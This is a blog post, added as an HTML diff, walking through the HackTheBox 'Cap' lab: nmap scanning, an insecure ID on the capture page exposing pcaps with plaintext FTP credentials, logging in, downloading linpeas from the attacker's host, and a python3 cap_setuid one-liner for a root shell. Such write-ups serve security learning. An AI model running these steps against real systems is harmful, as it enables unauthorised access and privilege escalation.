@@ -1,0 +1,541 @@
+<!DOCTYPE html><html lang="en-in"><head><meta charset="utf-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width,initial-scale=1"><title>HackTheBox Cap Walkthrough - h4ck3rfirst</title><meta name="robots" content="noindex,nofollow"><meta name="generator" content="Publii Open-Source CMS for Static Site"><meta property="og:title" content="HackTheBox Cap Walkthrough"><meta property="og:image" content="https://h4ck3rfirst.github.io/media/posts/7/cap.webp"><meta property="og:image:width" content="800"><meta property="og:image:height" content="450"><meta property="og:site_name" content="h4ck3rfirst"><meta property="og:description" content="Cap is an easy Linux machine on Hack The Box with an IP of 10.10.10.245. It introduces two key concepts&amp;hellip;"><meta property="og:url" content="https://h4ck3rfirst.github.io/hackthebox-cap-walkthrough/"><meta property="og:type" content="article"><link rel="stylesheet" href="https://h4ck3rfirst.github.io/assets/css/style.css?v&#x3D;1caf1a6f5543014e342e13c53b1080b8"><script type="application/ld+json">{"@context":"http://schema.org","@type":"Article","mainEntityOfPage":{"@type":"WebPage","@id":"https://h4ck3rfirst.github.io/hackthebox-cap-walkthrough/"},"headline":"HackTheBox Cap Walkthrough","datePublished":"2025-05-25T13:32+05:30","dateModified":"2026-09-29T22:33+05:30","image":{"@type":"ImageObject","url":"https://h4ck3rfirst.github.io/media/posts/7/cap.webp","height":450,"width":800},"description":"Cap is an easy Linux machine on Hack The Box with an IP of 10.10.10.245. It introduces two key concepts&hellip;","author":{"@type":"Person","name":"h4ck3rfirst","url":"https://h4ck3rfirst.github.io/authors/h4ck3rfirst/"},"publisher":{"@type":"Organization","name":"h4ck3rfirst","logo":{"@type":"ImageObject","url":"https://h4ck3rfirst.github.io/media/website/profile-2.png","height":300,"width":300}}}</script><noscript><style>img[loading] {
+                    opacity: 1;
+                }</style></noscript><style>@media (max-width: 600px) {
+    #publii-space-dust {
+        opacity: 0.85;
+    }
+}</style></head><body class="post-template"><div id="publii-space-dust" aria-hidden="true"><div id="publii-space-mouse-glow"></div></div><header class="top js-header"><a class="logo" href="https://h4ck3rfirst.github.io/"><img src="https://h4ck3rfirst.github.io/media/website/profile-2.png" alt="h4ck3rfirst" width="300" height="300"></a><nav class="navbar js-navbar"><button class="navbar__toggle js-toggle" aria-label="Menu" aria-haspopup="true" aria-expanded="false"><span class="navbar__toggle-box"><span class="navbar__toggle-inner">Menu</span></span></button><ul class="navbar__menu"><li><a href="https://h4ck3rfirst.github.io/" target="_self" rel="https://h4ck3rfirst.github.io/">Home</a></li><li><a href="https://h4ck3rfirst.github.io/tags/ctf-writeups/" target="_self">CTF/Labs</a></li><li><a href="https://h4ck3rfirst.github.io/tags/linux/" target="_self">Linux</a></li><li><a href="https://h4ck3rfirst.github.io/tags/windows/" target="_self">Windows</a></li><li><a href="https://h4ck3rfirst.github.io/tags/learning/" target="_self">Learning</a></li><li><a href="https://h4ck3rfirst.github.io/about-me/" target="_self">About me</a></li></ul></nav></header><main class="post"><article class="content"><div class="hero"><header class="hero__content"><div class="wrapper"><h1>HackTheBox Cap Walkthrough</h1><div class="feed__meta content__meta"><a href="https://h4ck3rfirst.github.io/authors/h4ck3rfirst/" class="feed__author">h4ck3rfirst</a> <time datetime="2025-05-25T13:32" class="feed__date">May 25, 2025</time></div></div></header><figure class="hero__image"><div class="hero__image-wrapper"><img src="https://h4ck3rfirst.github.io/media/posts/7/cap.webp" srcset="https://h4ck3rfirst.github.io/media/posts/7/responsive/cap-xs.webp 640w, https://h4ck3rfirst.github.io/media/posts/7/responsive/cap-sm.webp 768w, https://h4ck3rfirst.github.io/media/posts/7/responsive/cap-md.webp 1024w, https://h4ck3rfirst.github.io/media/posts/7/responsive/cap-lg.webp 1366w, https://h4ck3rfirst.github.io/media/posts/7/responsive/cap-xl.webp 1600w, https://h4ck3rfirst.github.io/media/posts/7/responsive/cap-2xl.webp 1920w" sizes="88vw" loading="eager" height="450" width="800" alt=""></div></figure></div><div class="entry-wrapper content__entry"><p><strong>Cap</strong> is an easy Linux machine on Hack The Box with an IP of <code>10.10.10.245</code>. It introduces two key concepts for beginners in cybersecurity:</p><ul><li>Packet capture (<code>pcap</code>) analysis.</li><li>Linux capabilities for privilege escalation.</li></ul><p>This walkthrough provides hints to nudge you toward solutions and detailed explanations to deepen your understanding. If you haven’t tried the machine yet, give it a shot on <a href="https://www.hackthebox.com">Hack The Box</a>.</p><h2 id="📝-introduction">📝 Introduction</h2><ul><li>Platform: HTB</li><li>Difficulty: Easy</li><li>Objective: Get <code>user.txt</code> and <code>root.txt</code></li></ul><hr><h2 id="🔍-reconnaissance">🔍 Reconnaissance</h2><h3 id="nmap-scan">Nmap Scan</h3><p>first, we will perform namp scanning of all ports and identity the service running on that port</p><pre><code>┌──(kali㉿kali)-[/media/sf_shared/ctf/Other]
+└─$ nmap -sC -sV -vv  10.10.10.245 
+Starting Nmap 7.95 ( https://nmap.org ) at 2025-09-27 20:16 IST
+Completed Ping Scan at 20:16, 1.02s elapsed (1 total hosts)
+Initiating Parallel DNS resolution of 1 host. at 20:16
+Completed Parallel DNS resolution of 1 host. at 20:16, 0.00s elapsed
+Initiating SYN Stealth Scan at 20:16
+Scanning 10.10.10.245 [1000 ports]
+Discovered open port 21/tcp on 10.10.10.245
+Discovered open port 22/tcp on 10.10.10.245
+Discovered open port 80/tcp on 10.10.10.245
+Host is up, received echo-reply ttl 63 (1.2s latency).
+Scanned at 2025-09-27 20:16:08 IST for 261s
+Not shown: 997 closed tcp ports (reset)
+PORT   STATE SERVICE REASON         VERSION
+21/tcp open  ftp     syn-ack ttl 63 vsftpd 3.0.3
+22/tcp open  ssh     syn-ack ttl 63 OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   3072 fa:80:a9:b2:ca:3b:88:69:a4:28:9e:39:0d:27:d5:75 (RSA)
+| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC2vrva1a+HtV5SnbxxtZSs+D8/EXPL2wiqOUG2ngq9zaPlF6cuLX3P2QYvGfh5bcAIVjIqNUmmc1eSHVxtbmNEQjyJdjZOP4i2IfX/RZUA18dWTfEWlNaoVDGBsc8zunvFk3nkyaynnXmlH7n3BLb1nRNyxtouW+q7VzhA6YK3ziOD6tXT7MMnDU7CfG1PfMqdU297OVP35BODg1gZawthjxMi5i5R1g3nyODudFoWaHu9GZ3D/dSQbMAxsly98L1Wr6YJ6M6xfqDurgOAl9i6TZ4zx93c/h1MO+mKH7EobPR/ZWrFGLeVFZbB6jYEflCty8W8Dwr7HOdF1gULr+Mj+BcykLlzPoEhD7YqjRBm8SHdicPP1huq+/3tN7Q/IOf68NNJDdeq6QuGKh1CKqloT/+QZzZcJRubxULUg8YLGsYUHd1umySv4cHHEXRl7vcZJst78eBqnYUtN3MweQr4ga1kQP4YZK5qUQCTPPmrKMa9NPh1sjHSdS8IwiH12V0=
+|   256 96:d8:f8:e3:e8:f7:71:36:c5:49:d5:9d:b6:a4:c9:0c (ECDSA)
+| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBDqG/RCH23t5Pr9sw6dCqvySMHEjxwCfMzBDypoNIMIa8iKYAe84s/X7vDbA9T/vtGDYzS+fw8I5MAGpX8deeKI=
+|   256 3f:d0:ff:91:eb:3b:f6:e1:9f:2e:8d:de:b3:de:b2:18 (ED25519)
+|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIPbLTiQl+6W0EOi8vS+sByUiZdBsuz0v/7zITtSuaTFH
+80/tcp open  http    syn-ack ttl 63 Gunicorn
+| http-methods: 
+|_  Supported Methods: HEAD OPTIONS GET
+|_http-title: Security Dashboard
+|_http-server-header: gunicorn
+Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
+
+
+Read data files from: /usr/share/nmap
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 262.42 seconds
+           Raw packets sent: 1170 (51.456KB) | Rcvd: 1174 (46.976KB)
+</code></pre><p>We found three ports are open</p><p>21/tcp: FTP</p><p>22/tcp: SSH</p><p>80/tcp: HTTP</p><p>** Let’s add Cap host to our /etc/hosts file. **</p><p><code>echo &quot;10.10.10.245 cap.htb&quot; | sudo tee -a /etc/hosts</code></p><h3 id="lets-start">lets start</h3><h2 id="enumration">Enumration</h2><h3 id="21-ftp-vsftpd">21 FTP vsftpd</h3><p>first, we will do anonymous login, it is like a default user:pass in vsftpd</p><pre><code>┌──(kali㉿kali)-[/media/sf_shared/ctf/Other]
+└─$ ftp  10.10.10.245 21
+Connected to 10.10.10.245.
+220 (vsFTPd 3.0.3)
+Name (10.10.10.245:kali): anonymous
+331 Please specify the password.
+Password: anonymous
+530 Login incorrect.
+ftp: Login failed
+
+┌──(kali㉿kali)-[/media/sf_shared/ctf/Other]
+└─$ searchsploit vsFTPd 3.0.3                                         
+-------------------------------------------------------------------------------------------------------------------- ---------------------------------
+ Exploit Title                                                                                                      |  Path
+-------------------------------------------------------------------------------------------------------------------- ---------------------------------
+vsftpd 3.0.3 - Remote Denial of Service                                                                             | multiple/remote/49719.py
+-------------------------------------------------------------------------------------------------------------------- ---------------------------------
+Shellcodes: No Results
+</code></pre><p>Tried anonymous login — no luck. So we move on to the HTTP service.</p><h3 id="22-ssh">22 ssh</h3><p>same we didn’t have user password</p><h3 id="80-http">80 http</h3><p>On this we will start with source code review</p><figure class="post__image"><img loading="lazy" src="https://miro.medium.com/v2/resize:fit:720/format:webp/1*6Bw1R9V64Ted9u6NiSK3Pg.png" alt="image" data-is-external-image="true"></figure><pre><code> &lt;a href=&quot;/&quot;&gt;Dashboard&lt;/a&gt;&lt;/li&gt;
+ &lt;li&gt;&lt;a href=&quot;/capture&quot;&gt;Security Snapshot (5 Second PCAP + Analysis)&lt;/a&gt;&lt;/li&gt;
+ &lt;li&gt;&lt;a href=&quot;/ip&quot;&gt;IP Config&lt;/a&gt;&lt;/li&gt;
+ &lt;li&gt;&lt;a href=&quot;/netstat&quot;&gt;Network Status&lt;/a&gt;&lt;/li&gt;
+</code></pre><p>Found some directory</p><p>/ip</p><figure class="post__image"><img src="https://miro.medium.com/v2/resize:fit:720/format:webp/1*i-9OhPxNH9KgeT_ocEnE_g.png" alt="image" data-is-external-image="true"></figure><p>/capture</p><figure class="post__image"><img loading="lazy" src="https://miro.medium.com/v2/resize:fit:720/format:webp/1*baGiDLJmHmFqXnhOIx6imw.png" alt="image" data-is-external-image="true"></figure><p>Download the pcap file and analzye it to see whether we can find anything interesting or not.</p><p>we can see that, URL contains the numeric ID for the Security Snapshot. We can change the ID and try to see we can access other user’s or not!</p><p>We changed the ID from 2 to 0 and as we can see result as Snapshot results are getting changed.</p><p>We are download all Analyzing PCAPs with Wireshark</p><p>Download the pcap from /data/0, /data/1, and open it in Wireshark:</p><p>Observation: The pcap shows FTP traffic, which uses plaintext.</p><p>Credentials Found:</p><p>Username: nathan (lowercase).<br>Password: Buck3tH4TF0RM3!<br></p><figure class="post__image"><img loading="lazy" src="https://miro.medium.com/v2/resize:fit:786/format:webp/1*ljQwvsmvAmfNn_KrLn7-kw.png" alt="image" data-is-external-image="true"></figure><p></p><p>Why Plaintext? FTP lacks encryption, unlike FTPS or SFTP, making credentials visible.</p><h2 id="initial-access">Initial Access</h2><p>Use the credentials (nathan:Buck3tH4TF0RM3!) to access services identified in the scan.</p><p>Using Credentials We will login on ftp and ssh</p><p>ftp</p><pre><code>┌──(kali㉿kali)-[/media/sf_shared/ctf/Other]
+└─$ ftp 10.10.10.245
+Connected to 10.10.10.245.
+220 (vsFTPd 3.0.3)
+Name (10.10.10.245:kali): nathan
+331 Please specify the password.
+Password: 
+230 Login successful.
+Remote system type is UNIX.
+Using binary mode to transfer files.
+ftp&gt; ls
+229 Entering Extended Passive Mode (|||16525|)
+150 Here comes the directory listing.
+drwxrwxr-x    2 1001     1001         4096 Sep 27 07:19 GCONV_PATH=.
+-rw-rw-r--    1 1001     1001         3262 Sep 27 07:19 cc.py
+drwxrwxr-x    2 1001     1001         4096 Sep 27 07:19 exploit
+-rwxr-xr-x    1 1001     1001          431 Sep 27 07:19 payload.so
+drwxr-xr-x    3 1001     1001         4096 Sep 27 12:52 snap
+-r--------    1 1001     1001           33 Sep 26 19:35 user.txt
+226 Directory send OK.
+ftp&gt; cat user.txt
+?Invalid command.
+ftp&gt; get user.txt
+local: user.txt remote: user.txt
+229 Entering Extended Passive Mode (|||9896|)
+150 Opening BINARY mode data connection for user.txt (33 bytes).
+100% |*********************************************************************************************************|    33        0.16 KiB/s    00:00 ETA
+226 Transfer complete.
+33 bytes received in 00:00 (0.03 KiB/s)
+ftp&gt;
+</code></pre><p>Boom we logged in</p><pre><code>┌──(kali㉿kali)-[/media/sf_shared/ctf/Other]
+└─$ cat user.txt
+1a90e31c2ead2766ada------------
+</code></pre><p>ssh</p><pre><code>nathan@cap:~$ ls
+user.txt
+</code></pre><h2 id="roottxt">Root.txt</h2><p>Privilege escalation</p><pre><code>nathan@cap:/tmp$ wget http://10.1-----4:8000/linpeas.sh
+--2025-09-27 16:06:04--  http://10.10.16.34:8000/linpeas.sh
+Connecting to 10.10.16.34:8000... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 956174 (934K) [text/x-sh]
+Saving to: ‘linpeas.sh’
+
+linpeas.sh                            100%[=======================================================================&gt;] 933.76K   229KB/s    in 5.4s    
+
+2025-09-27 16:06:11 (174 KB/s) - ‘linpeas.sh’ saved [956174/956174]
+</code></pre><figure class="post__image"><img src="https://miro.medium.com/v2/resize:fit:720/format:webp/1*jIzloi-RTi1iSPGawOZ1zg.png" alt="image" data-is-external-image="true"></figure><p>After searching GTFOBins, we can know that this exploit functions similarly to SETUID and can be effectively exploited.</p><figure class="post__image"><img loading="lazy" src="https://miro.medium.com/v2/resize:fit:720/format:webp/1*YFOrHtuf1GvqfFyrFBPsEA.png" alt="image" data-is-external-image="true"></figure><p>To gain root shell, we execute the following command since only Python 3 is available:</p><pre><code>python3 -c &#39;import os; os.setuid(0); os.system(&quot;/bin/sh&quot;)&#39;
+</code></pre><p>How It Works:</p><p>os.setuid(0): Changes the script’s user ID to root (0), leveraging cap_setuid.</p><p>os.system(“/bin/bash”): Opens a shell with root privileges.</p><p>Verification: Run whoami in the shell to confirm root.</p><figure class="post__image"><img loading="lazy" src="https://miro.medium.com/v2/resize:fit:640/format:webp/1*0yrpdRAnpfBYgn9m9GARuA.png" alt="image" data-is-external-image="true"></figure></div><footer class="content__footer"><div class="entry-wrapper"><p class="content__updated">This article was updated on September 29, 2026</p><div class="content__actions"><ul class="content__tag"><li><a href="https://h4ck3rfirst.github.io/tags/easy/">Easy</a></li><li><a href="https://h4ck3rfirst.github.io/tags/exploit/">exploit</a></li><li><a href="https://h4ck3rfirst.github.io/tags/ftp/">Ftp</a></li><li><a href="https://h4ck3rfirst.github.io/tags/hackthebox/">hackthebox</a></li><li><a href="https://h4ck3rfirst.github.io/tags/htb/">htb</a></li><li><a href="https://h4ck3rfirst.github.io/tags/http/">Http</a></li><li><a href="https://h4ck3rfirst.github.io/tags/nmap/">Nmap</a></li><li><a href="https://h4ck3rfirst.github.io/tags/pcap/">Pcap</a></li><li><a href="https://h4ck3rfirst.github.io/tags/setuid/">setuid</a></li><li><a href="https://h4ck3rfirst.github.io/tags/ssh/">Ssh</a></li></ul><div class="content__share"><button class="btn--icon content__share-button js-content__share-button"><svg width="20" height="20" aria-hidden="true"><use xlink:href="https://h4ck3rfirst.github.io/assets/svg/svg-map.svg#share"></use></svg> <span>Share It</span></button><div class="content__share-popup js-content__share-popup"><a href="https://www.linkedin.com/sharing/share-offsite/?url=https%3A%2F%2Fh4ck3rfirst.github.io%2Fhackthebox-cap-walkthrough%2F" class="js-share linkedin" rel="nofollow noopener noreferrer"><svg class="icon" aria-hidden="true" focusable="false"><use xlink:href="https://h4ck3rfirst.github.io/assets/svg/svg-map.svg#linkedin"/></svg> <span>LinkedIn</span> </a><a href="https://buffer.com/add?text=HackTheBox%20Cap%20Walkthrough&amp;url=https%3A%2F%2Fh4ck3rfirst.github.io%2Fhackthebox-cap-walkthrough%2F" class="js-share buffer" rel="nofollow noopener noreferrer"><svg class="icon" aria-hidden="true" focusable="false"><use xlink:href="https://h4ck3rfirst.github.io/assets/svg/svg-map.svg#buffer"/></svg> <span>Buffer</span> </a><a href="https://api.whatsapp.com/send?text=HackTheBox%20Cap%20Walkthrough https%3A%2F%2Fh4ck3rfirst.github.io%2Fhackthebox-cap-walkthrough%2F" class="js-share whatsapp" rel="nofollow noopener noreferrer"><svg class="icon" aria-hidden="true" focusable="false"><use xlink:href="https://h4ck3rfirst.github.io/assets/svg/svg-map.svg#whatsapp"/></svg> <span>WhatsApp</span></a></div></div></div><div class="content__bio bio"><div><h3 class="h4 bio__name"><a href="https://h4ck3rfirst.github.io/authors/h4ck3rfirst/" rel="author">h4ck3rfirst</a></h3></div></div></div><nav class="content__nav"><div class="wrapper"><div class="content__nav-inner"><div class="content__nav-prev"><a href="https://h4ck3rfirst.github.io/tryhackme-lookup-walkthrough/" class="content__nav-link" rel="prev"><div><span>Previous</span> Tryhackme Lookup Walkthrough</div></a></div><div class="content__nav-next"><a href="https://h4ck3rfirst.github.io/tryhackme-mr-robot-walkthrough/" class="content__nav-link" rel="next"><div><span>Next</span> Tryhackme Mr robot Walkthrough</div></a></div></div></div></nav></footer></article><div class="content__related related"><div class="wrapper"><h2 class="h4 related__title">You should also read:</h2><article class="feed__item feed__item--centered"><figure class="feed__image related__image"><img src="https://h4ck3rfirst.github.io/media/posts/17/cheese.jpg" srcset="https://h4ck3rfirst.github.io/media/posts/17/responsive/cheese-xs.jpg 640w, https://h4ck3rfirst.github.io/media/posts/17/responsive/cheese-sm.jpg 768w, https://h4ck3rfirst.github.io/media/posts/17/responsive/cheese-md.jpg 1024w" sizes="(min-width: 600px) calc(4.38vw + 143px), 87.86vw" loading="lazy" height="447" width="447" alt=""></figure><div class="feed__content"><header><div class="feed__meta"><a href="https://h4ck3rfirst.github.io/authors/h4ck3rfirst/" class="feed__author">h4ck3rfirst</a> <time datetime="2025-07-27T16:00" class="feed__date">July 27, 2025</time></div><h3 class="feed__title"><a href="https://h4ck3rfirst.github.io/tryhackme-cheese-walkthrough/">Tryhackme Cheese Walkthrough</a></h3></header><p>This is a write-up for the CheeseCTF Medium room on TryHackMe, which involves exploiting a vulnerable web application to escalate&hellip;</p></div></article><article class="feed__item feed__item--centered"><div class="feed__content"><header><div class="feed__meta"><a href="https://h4ck3rfirst.github.io/authors/h4ck3rfirst/" class="feed__author">h4ck3rfirst</a> <time datetime="2025-03-02T18:36" class="feed__date">March 2, 2025</time></div><h3 class="feed__title"><a href="https://h4ck3rfirst.github.io/tryhackme-lookup-walkthrough/">Tryhackme Lookup Walkthrough</a></h3></header><p>tags: [ctf, enumeration, exploit, Lookup, writeups, htb, writeups, tryhackme, Linux, wordpress, cracking, walkthrough] Welcome to the walkthrough for the Lookup&hellip;</p></div></article><article class="feed__item feed__item--centered"><div class="feed__content"><header><div class="feed__meta"><a href="https://h4ck3rfirst.github.io/authors/h4ck3rfirst/" class="feed__author">h4ck3rfirst</a> <time datetime="2025-11-12T06:55" class="feed__date">November 12, 2025</time></div><h3 class="feed__title"><a href="https://h4ck3rfirst.github.io/bandit-level-0-33-full-walkthrough/">Bandit – Level 0 → 33 Full Walkthrough</a></h3></header><p>wargame ssh enumeration privilege-escalation forensics stego Game: OverTheWire – Bandit Difficulty: Beginner → Intermediate Levels: 0 → 33 (34 total)&hellip;</p></div></article></div></div></main><footer class="footer footer--glued"><div class="wrapper"><div class="footer__copyright"><h6>Documenting the world of bug bounties, pentesting, and security engineering one lab at a time.</h6><p class="align-center">© 2026 h4ck3rfirst . Built with 😊.</p></div><button id="backToTop" class="footer__bttop" aria-label="Back to top" title="Back to top"><svg width="20" height="20"><use xlink:href="https://h4ck3rfirst.github.io/assets/svg/svg-map.svg#toparrow"/></svg></button></div></footer><script defer="defer" src="https://h4ck3rfirst.github.io/assets/js/scripts.min.js?v&#x3D;dafec4f87fead6718cb125f0b0fc8441"></script><script>window.publiiThemeMenuConfig={mobileMenuMode:'sidebar',animationSpeed:300,submenuWidth: 'auto',doubleClickTime:500,mobileMenuExpandableSubmenus:true,relatedContainerForOverlayMenuSelector:'.top'};</script><script>var images = document.querySelectorAll('img[loading]');
+        for (var i = 0; i < images.length; i++) {
+            if (images[i].complete) {
+                images[i].classList.add('is-loaded');
+            } else {
+                images[i].addEventListener('load', function () {
+                    this.classList.add('is-loaded');
+                }, false);
+            }
+        }</script><script>(function () {
+    "use strict";
+
+    const space = document.getElementById("publii-space-dust");
+
+    if (!space) return;
+
+    /* ================================
+       SETTINGS
+       ================================ */
+
+    const STAR_COUNT = 1200;
+
+    /*
+     * Approximately 2 cm on a typical desktop display.
+     * CSS pixels are not physically exact across monitors,
+     * so this is an approximate interaction radius.
+     */
+    const MOUSE_RADIUS = 75;
+
+    /* How fast the dust moves */
+    const MIN_SPEED = 0.99;
+    const MAX_SPEED = 2.99;
+
+    /* How often stars twinkle */
+    const MIN_TWINKLE = 0.9;
+    const MAX_TWINKLE = 2.8;
+
+    /* ================================
+       VARIABLES
+       ================================ */
+
+    const stars = [];
+    let mouseX = -9999;
+    let mouseY = -9999;
+    let animationFrame;
+
+    const glow = document.getElementById(
+        "publii-space-mouse-glow"
+    );
+
+    /* ================================
+       RANDOM HELPERS
+       ================================ */
+
+    function random(min, max) {
+        return Math.random() * (max - min) + min;
+    }
+
+    function clamp(value, min, max) {
+        return Math.max(min, Math.min(max, value));
+    }
+
+    /* ================================
+       CREATE STARS
+       ================================ */
+
+    for (let i = 0; i < STAR_COUNT; i++) {
+
+        const star = document.createElement("span");
+
+        star.className = "publii-star";
+
+        /*
+         * Most particles are tiny.
+         * A few are slightly larger.
+         */
+        const sizeChance = Math.random();
+
+        let size;
+
+        if (sizeChance > 0.992) {
+            size = random(3.0, 4.5);
+            star.classList.add("big");
+        } else if (sizeChance > 0.96) {
+            size = random(1.8, 3.2);
+        } else if (sizeChance > 0.82) {
+          // Normal stars
+    	size = random(1.0, 1.8);
+		} else {
+    	// Tiny space dust
+    	size = random(0.4, 1.1);
+		}
+
+        star.style.width = size + "px";
+        star.style.height = size + "px";
+
+        const x = Math.random() * window.innerWidth;
+        const y = Math.random() * window.innerHeight;
+
+        star.style.left = x + "px";
+        star.style.top = y + "px";
+
+        /*
+         * Each particle gets its own direction
+         * and speed so the background feels like dust.
+         */
+        const angle = random(0, Math.PI * 2);
+
+        const speed = random(
+            MIN_SPEED,
+            MAX_SPEED
+        );
+
+        /*
+         * Twinkle timing
+         */
+        const twinkleDuration = random(
+            MIN_TWINKLE,
+            MAX_TWINKLE
+        );
+
+        const twinkleDelay = random(
+            0,
+            MAX_TWINKLE
+        );
+
+        star.style.animation =
+            "publiiStarTwinkle " +
+            twinkleDuration +
+            "s ease-in-out " +
+            twinkleDelay +
+            "s infinite";
+
+        /*
+         * Store particle information.
+         */
+        stars.push({
+            element: star,
+
+            x: x,
+            y: y,
+
+            vx: Math.cos(angle) * speed,
+            vy: Math.sin(angle) * speed,
+
+            baseOpacity: random(0.25, 0.9),
+
+            size: size
+        });
+
+        space.appendChild(star);
+    }
+
+    /* ================================
+       ADD TWINKLE ANIMATION
+       ================================ */
+
+    const style = document.createElement("style");
+
+    style.textContent = `
+        @keyframes publiiStarTwinkle {
+            0%, 100% {
+                opacity: 0.08;
+            }
+
+            25% {
+                opacity: 0.35;
+            }
+
+            50% {
+                opacity: 1;
+            }
+
+            75% {
+                opacity: 0.4;
+            }
+        }
+    `;
+
+    document.head.appendChild(style);
+
+    /* ================================
+       MOUSE
+       ================================ */
+
+    window.addEventListener(
+        "mousemove",
+        function (event) {
+
+            mouseX = event.clientX;
+            mouseY = event.clientY;
+
+            if (glow) {
+                glow.style.left = mouseX + "px";
+                glow.style.top = mouseY + "px";
+            }
+        },
+        { passive: true }
+    );
+
+    /*
+     * Remove mouse interaction when
+     * pointer leaves the browser window.
+     */
+    document.addEventListener(
+        "mouseleave",
+        function () {
+            mouseX = -9999;
+            mouseY = -9999;
+        }
+    );
+
+    /* ================================
+       TOUCH
+       ================================ */
+
+    window.addEventListener(
+        "touchmove",
+        function (event) {
+
+            if (!event.touches.length) return;
+
+            mouseX = event.touches[0].clientX;
+            mouseY = event.touches[0].clientY;
+
+            if (glow) {
+                glow.style.left = mouseX + "px";
+                glow.style.top = mouseY + "px";
+            }
+        },
+        { passive: true }
+    );
+
+    /* ================================
+       ANIMATION
+       ================================ */
+
+    function animate() {
+
+        const width = window.innerWidth;
+        const height = window.innerHeight;
+
+        for (let i = 0; i < stars.length; i++) {
+
+            const star = stars[i];
+
+            /*
+             * Move dust
+             */
+            star.x += star.vx;
+            star.y += star.vy;
+
+            /*
+             * Wrap around screen edges
+             */
+            if (star.x < -10) {
+                star.x = width + 10;
+            }
+
+            if (star.x > width + 10) {
+                star.x = -10;
+            }
+
+            if (star.y < -10) {
+                star.y = height + 10;
+            }
+
+            if (star.y > height + 10) {
+                star.y = -10;
+            }
+
+            /*
+             * Move particle
+             */
+            star.element.style.transform =
+                "translate3d(" +
+                star.x +
+                "px," +
+                star.y +
+                "px,0)";
+        }
+
+        animationFrame = requestAnimationFrame(animate);
+    }
+
+    animate();
+
+    /* ================================
+       MOUSE CONNECTIONS
+       ================================ */
+
+    /*
+     * Instead of permanently creating 800 lines,
+     * we create them only when needed.
+     */
+
+    let lastLineUpdate = 0;
+
+    function updateConnections(timestamp) {
+
+        /*
+         * Limit line calculations to about 30fps.
+         * This keeps 800 particles smooth.
+         */
+        if (timestamp - lastLineUpdate < 33) {
+            requestAnimationFrame(updateConnections);
+            return;
+        }
+
+        lastLineUpdate = timestamp;
+
+        /*
+         * Delete old connection lines.
+         */
+        const oldLines =
+            space.querySelectorAll(
+                ".publii-star-line"
+            );
+
+        oldLines.forEach(function (line) {
+            line.remove();
+        });
+
+        /*
+         * No mouse = no connections.
+         */
+        if (mouseX < 0 || mouseY < 0) {
+            requestAnimationFrame(updateConnections);
+            return;
+        }
+
+        /*
+         * Find stars close to mouse.
+         */
+        for (let i = 0; i < stars.length; i++) {
+
+            const star = stars[i];
+
+            const dx = star.x - mouseX;
+            const dy = star.y - mouseY;
+
+            const distance =
+                Math.sqrt(dx * dx + dy * dy);
+
+            if (distance <= MOUSE_RADIUS) {
+
+                /*
+                 * Only connect fairly close stars
+                 * to the mouse.
+                 */
+                const line =
+                    document.createElement("span");
+
+                line.className =
+                    "publii-star-line";
+
+                const angle =
+                    Math.atan2(
+                        star.y - mouseY,
+                        star.x - mouseX
+                    ) * 180 / Math.PI;
+
+                line.style.left =
+                    mouseX + "px";
+
+                line.style.top =
+                    mouseY + "px";
+
+                line.style.width =
+                    distance + "px";
+
+                line.style.transform =
+                    "rotate(" + angle + "deg)";
+
+                /*
+                 * Closer = brighter.
+                 */
+                const opacity =
+                    1 - distance / MOUSE_RADIUS;
+
+                line.style.opacity =
+                    (opacity * 0.7).toFixed(2);
+
+                space.appendChild(line);
+            }
+        }
+
+        requestAnimationFrame(updateConnections);
+    }
+
+    requestAnimationFrame(updateConnections);
+
+    /* ================================
+       RESIZE
+       ================================ */
+
+    window.addEventListener(
+        "resize",
+        function () {
+
+            /*
+             * Keep stars inside the new viewport.
+             */
+            const width = window.innerWidth;
+            const height = window.innerHeight;
+
+            stars.forEach(function (star) {
+
+                if (star.x > width) {
+                    star.x = Math.random() * width;
+                }
+
+                if (star.y > height) {
+                    star.y = Math.random() * height;
+                }
+            });
+        }
+    );
+
+    /* ================================
+       CLEANUP
+       ================================ */
+
+    window.addEventListener(
+        "pagehide",
+        function () {
+            cancelAnimationFrame(animationFrame);
+        }
+    );
+
+})();</script></body></html>
